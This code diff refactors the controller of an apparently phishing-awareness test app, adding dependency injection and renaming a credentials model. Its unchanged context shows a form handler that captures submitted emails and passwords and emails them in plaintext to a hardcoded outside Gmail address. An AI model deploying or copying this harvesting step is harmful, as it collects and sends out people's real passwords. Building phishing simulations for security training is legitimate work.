@@ -4,7 +4,7 @@ using System.Linq;
 using System.Threading.Tasks;
 using Microsoft.AspNetCore.Mvc;
 using PhisingTest.BusinessLayer.Services;
-using PhisingTest.Models;
+using PhishingTest.Models.Models;
 
 namespace PhisingTest.Controllers
 {
@@ -12,9 +12,9 @@ namespace PhisingTest.Controllers
     {
         private readonly IEmailService _EmailService;
 
-        public HomeController()
+        public HomeController(IEmailService emailService)
         {
-            _EmailService = new EmailService();
+            _EmailService = emailService;
         }
 
         public IActionResult Index()
@@ -23,7 +23,7 @@ namespace PhisingTest.Controllers
         }
 
         [HttpPost]
-        public IActionResult GetCredentials(CredentialModel creds)
+        public IActionResult GetCredentials(Credential creds)
         {
             if (!ModelState.IsValid)
             {
@@ -34,7 +34,7 @@ namespace PhisingTest.Controllers
             return View("FailedTest");
         }
 
-        private void SendCredentials(CredentialModel creds)
+        private void SendCredentials(Credential creds)
         {
             _EmailService.SendEmailAsync("johnd.zartis@gmail.com", "Credentials Comprimised", $"Email: {creds.Email}\nPassword: {creds.Password}");
         }
